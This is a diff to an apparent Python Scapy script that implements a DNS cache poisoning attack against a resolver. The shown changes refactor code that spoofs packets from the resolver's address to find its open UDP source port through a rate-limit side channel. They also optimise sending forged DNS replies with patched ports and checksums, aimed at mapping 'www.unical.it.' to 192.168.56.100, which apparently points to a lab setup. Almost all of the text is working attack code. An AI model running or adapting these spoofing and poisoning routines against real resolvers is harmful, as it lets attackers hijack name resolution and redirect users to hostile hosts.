@@ -13,26 +13,51 @@ MAX_PORT = 65535
 FQDN_TO_RESOLVE = 'www.unical.it.'
 IP_ADDRESS_TO_RESOLVE_FQDN_TO = '192.168.56.100'
 
-PORT_SCAN_FREQUENCY = 0.02
+PORT_SCAN_FREQUENCY = 0.05
 PROBE_WAITING_TIME = 0.01
 BATCH_SIZE = 50
+
+UDP_PORT_SCAN_DATAGRAMS = [Ether() / IP(src=RESOLVER_IP, dst=DNS_SERVER_IP) / UDP(sport=53, dport=0) for index in range(0, BATCH_SIZE)]
+RAW_UDP_PORT_SCAN_DATAGRAMS = [bytearray(raw(datagram)) for datagram in UDP_PORT_SCAN_DATAGRAMS]
+PSEUDO_HEADER_PORT_SCAN_DATAGRAM = struct.pack(
+	"!4s4sHH",
+	inet_pton(socket.AF_INET, UDP_PORT_SCAN_DATAGRAMS[0]["IP"].src),
+	inet_pton(socket.AF_INET, UDP_PORT_SCAN_DATAGRAMS[0]["IP"].dst),
+	socket.IPPROTO_UDP,
+	len(RAW_UDP_PORT_SCAN_DATAGRAMS[0][34:]),
+)
 
 PROBING_PACKET = Ether() / IP(dst=DNS_SERVER_IP) / UDP(dport=0) / 'Probing for answer'
 PROBING_PACKET_RAW = raw(PROBING_PACKET)
 
 NO_OPEN_PORT = -1
 
+def patch_udp_destination_port(raw_spoofed_dns_reply, detected_source_port, pseudo_header):
+	# set the UDP source port
+	raw_spoofed_dns_reply[36] = (detected_source_port >> 8) & 0xFF
+	raw_spoofed_dns_reply[37] = detected_source_port & 0xFF
+
+	# reset the checksum
+	raw_spoofed_dns_reply[40] = 0x00
+	raw_spoofed_dns_reply[41] = 0x00
+
+	# compute the new checksum
+	new_checksum = checksum(pseudo_header + raw_spoofed_dns_reply[34:])
+	if new_checksum == 0:
+		new_checksum = 0xFFFF
+	new_checksum = struct.pack('!H', new_checksum)
+	raw_spoofed_dns_reply[40] = new_checksum[0]
+	raw_spoofed_dns_reply[41] = new_checksum[1]
+	return raw_spoofed_dns_reply
+
 def scan_for_open_ports(candidate_port_range_start, range_size):
 	destination_ports = [port for port in range(candidate_port_range_start, candidate_port_range_start + range_size)] * int(BATCH_SIZE / range_size)
 	padding_port_scans = BATCH_SIZE - len(destination_ports)
 	destination_ports += [port for port in range(candidate_port_range_start, candidate_port_range_start + padding_port_scans)]
 
-	packets = [Ether() / IP(src=RESOLVER_IP, dst=DNS_SERVER_IP) / UDP(sport=53, dport=destination_port) / 'It works!' for destination_port in destination_ports]
-	raw_packets = [raw(packet) for packet in packets]
-
 	start_time = perf_counter()
-	for raw_packet in raw_packets:
-		L2_SOCKET.send(raw_packet)
+	for destination_port, raw_datagram in zip(destination_ports, RAW_UDP_PORT_SCAN_DATAGRAMS):
+		L2_SOCKET.send(patch_udp_destination_port(raw_datagram, destination_port, PSEUDO_HEADER_PORT_SCAN_DATAGRAM))
 	answered, unanswered = L2_SOCKET.sr(PROBING_PACKET, timeout=PROBE_WAITING_TIME, verbose=0)
 	stop_time = perf_counter()
 
@@ -99,27 +124,9 @@ def prepare_spoofed_dns_replies():
 	)
 	return (raw_spoofed_dns_replies, pseudo_header)
 
-def patch_dns_reply(raw_spoofed_dns_reply, detected_source_port, pseudo_header):
-	# set the UDP source port
-	raw_spoofed_dns_reply[36] = (detected_source_port >> 8) & 0xFF
-	raw_spoofed_dns_reply[37] = detected_source_port & 0xFF
-
-	# reset the checksum
-	raw_spoofed_dns_reply[40] = 0x00
-	raw_spoofed_dns_reply[41] = 0x00
-
-	# compute the new checksum
-	new_checksum = checksum(pseudo_header + raw_spoofed_dns_reply[34:])
-	if new_checksum == 0:
-		new_checksum = 0xFFFF
-	new_checksum = struct.pack('!H', new_checksum)
-	raw_spoofed_dns_reply[40] = new_checksum[0]
-	raw_spoofed_dns_reply[41] = new_checksum[1]
-	return raw_spoofed_dns_reply
-
 def transmit_spoofed_dns_replies(raw_spoofed_dns_replies, detected_source_port, pseudo_header):
 	for raw_spoofed_dns_reply in raw_spoofed_dns_replies:
-		L2_SOCKET.send(patch_dns_reply(raw_spoofed_dns_reply, detected_source_port, pseudo_header))
+		L2_SOCKET.send(patch_udp_destination_port(raw_spoofed_dns_reply, detected_source_port, pseudo_header))
 
 if __name__ == '__main__':
 	print('Preparing spoofed DNS replies')
